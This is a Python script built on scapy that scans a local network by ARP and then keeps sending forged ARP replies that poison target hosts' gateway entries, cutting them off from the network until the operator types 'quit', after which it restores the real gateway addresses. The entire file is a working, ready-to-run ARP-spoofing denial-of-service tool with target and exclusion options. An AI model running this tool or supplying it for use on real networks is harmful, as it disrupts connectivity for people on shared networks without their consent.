import scapy.all as scapy
import argparse
import multiprocessing
import threading
import time


CLIENTS = {}
SENT_PACKETS = 0
SEMAPHORE = 1
DOWN = threading.Event()

def scan_mac(mac, net):
    mac = to_dict(mac)
    arp_request = scapy.Ether(dst='ff:ff:ff:ff:ff:ff') / scapy.ARP(op='who-has', pdst=net)
    ans, unans = scapy.srp(arp_request, timeout=3, verbose=False)
    clients = {x[1].psrc: {'ip': x[1].psrc, 'mac': x[1].hwsrc,} for x in ans if x[1].hwsrc in mac}
    return clients

def scan_mac_get_ip(mac, net):
    mac = to_dict(mac)
    arp_request = scapy.Ether(dst='ff:ff:ff:ff:ff:ff') / scapy.ARP(op='who-has', pdst=net)
    ans, unans = scapy.srp(arp_request, timeout=3, verbose=False)
    clients = [x[1].psrc for x in ans if x[1].hwsrc in mac]
    return clients

def scan(ip):
    arp_request = scapy.Ether(dst='ff:ff:ff:ff:ff:ff') / scapy.ARP(op='who-has', pdst=ip)
    ans, unans = scapy.srp(arp_request, timeout=3, verbose=False)
    clients = {x[1].psrc: {'ip': x[1].psrc, 'mac': x[1].hwsrc,} for x in ans}
    return clients


def get_own_ips():
    return [x[4] for x in scapy.conf.route.routes if x[2] != '0.0.0.0']


def get_mac(ip):
    return list(scan(ip).values())[0]['mac']


def update_clients(args):
    try:
        global CLIENTS, SEMAPHORE
        while True:
            while SEMAPHORE == 0 and DOWN.is_set() == False:
                time.sleep(1)
            if DOWN.is_set():
                break
            SEMAPHORE -= 1
            clients = {}
            for target in args.target:
                clients.update(scan(target))
            for net in args.subnet:
                clients.update(scan_mac(args.target_mac, net)) 
            exclude_ips = get_own_ips()
            exclude_ips = exclude_ips + args.gateway + args.exclude
            for net in args.subnet:
                scanned_mac = scan_mac_get_ip(args.exclude_mac, net)    
                exclude_ips = exclude_ips + scanned_mac
            for ip in exclude_ips:
                if ip in clients:
                    del clients[ip]
            CLIENTS = clients
            SEMAPHORE += 1
            DOWN.wait(5 * args.interval)
    except Exception as e:
        print(e)
        DOWN.set()

def sucker_punch(args):
    try:
        global SEMAPHORE, SENT_PACKETS
        while True:
            while SEMAPHORE == 0 and DOWN.is_set() == False:
                time.sleep(1)
            if DOWN.is_set():
                break
            SEMAPHORE -= 1
            for client in CLIENTS:
                if DOWN.is_set():
                    SEMAPHORE += 1
                    break
                for i in range(len(args.gateway)):
                    packet = scapy.ARP(op='is-at', psrc=args.gateway[i], hwsrc=CLIENTS[client]['mac'], pdst=CLIENTS[client]['ip'], hwdst=CLIENTS[client]['mac'])
                    scapy.send(packet, verbose=False)
                    SENT_PACKETS += 1
                    print('\r[+] Packets sent: {}'.format(SENT_PACKETS), end='')
            SEMAPHORE += 1
            DOWN.wait(args.interval)
    except Exception as e:
        print(e)
        DOWN.set()


def run_away(args):
    gateway_macs = [get_mac(gateway) for gateway in args.gateway]
    for client in CLIENTS:
        [
            scapy.send(
                scapy.ARP(op='is-at', psrc=args.gateway[i], hwsrc=gateway_macs[i], pdst=CLIENTS[client]['ip'], hwdst=CLIENTS[client]['mac']), 
                verbose=False, count=5, inter=0.2
            )
            for i in range(len(gateway_macs))
        ]


def disarm():
    while True:
        if DOWN.is_set():
            break
        if input() == 'quit':
            DOWN.set()
            break


def read_file(file):
    ret = []
    try:
        with open(file, 'r') as f:
            ret = [line.rstrip('\n') for line in f]
    except:
        pass
    return ret

def to_dict(lst):
    res = {lst[i]: True for i in range(len(lst))}
    return res


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-s', '--subnet', default=None, help='path to file contains subnets')
    parser.add_argument('-g', '--gateway', default=None, help='path to file contains gateway IP')
    parser.add_argument('-t', '--target', default=None, help='path to file contains target IP')
    parser.add_argument('-e', '--exclude', default=None, help='path to file contains IP to be excluded')
    parser.add_argument('-tm', '--target-mac', default=None, help='path to file contains target MAC')
    parser.add_argument('-em', '--exclude-mac', default=None, help='path to file contains MAC to be excluded')
    parser.add_argument('-i', '--interval',  default=10, type=float, help='time interval to send ARP packets')
    args = parser.parse_args()
    assert(args.gateway is not None and args.target is not None)
    try:
        t_start = time.time()
        args.subnet = read_file(args.subnet)
        args.gateway = read_file(args.gateway)
        args.target = read_file(args.target)
        args.exclude = read_file(args.exclude)
        args.target_mac = read_file(args.target_mac)
        args.exclude_mac = read_file(args.exclude_mac)
        t0 = threading.Thread(target=disarm, args=())
        t1 = threading.Thread(target=update_clients, args=(args,))
        t2 = threading.Thread(target=sucker_punch, args=(args,))
        t0.start()
        t1.start()
        t2.start()
    except Exception as e:
        print(e)
    finally:
        t0.join()
        t1.join()
        t2.join()
        run_away(args)
        t_finish = time.time()
        print('Time elapsed: {}'.format(t_finish - t_start))
